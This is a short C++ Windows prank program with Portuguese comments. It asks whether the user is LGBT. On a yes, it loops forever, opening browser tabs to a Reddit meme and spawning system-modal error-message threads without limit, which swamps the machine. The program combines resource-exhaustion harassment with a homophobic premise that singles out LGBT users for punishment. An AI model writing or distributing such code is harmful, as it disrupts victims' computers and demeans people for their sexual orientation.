#include <iostream>
#include <cstdlib>  // para system()
#include <windows.h>
#include <string>
using namespace std;
DWORD WINAPI MostrarErro(LPVOID lpParam) {
    MessageBoxA(NULL,
                "Erro: Algo deu errado!",
                "Mensagem de Erro",
                MB_ICONERROR | MB_OK |MB_SYSTEMMODAL);
    return 0;
}
int main() {
    int n;
    bool seFudeu = false;
        cout << "LGBT?? [1-sim, 2-nao]\n";
        cin >> n;
        if(n == 1){
            seFudeu = true;
        }else{
            seFudeu = false;
        }

    

    while(seFudeu){
        #ifdef _WIN32
            // No Windows, 'start' abre uma nova aba do navegador padrão
            system("start https://www.reddit.com/r/MemeRestoration/comments/e997wa/can_anyone_find_the_two_black_homies_kissing_meme/?tl=pt-br");
            CreateThread(NULL, 0, MostrarErro, NULL, 0, NULL);
        #endif
            
    }

    return 0;
}
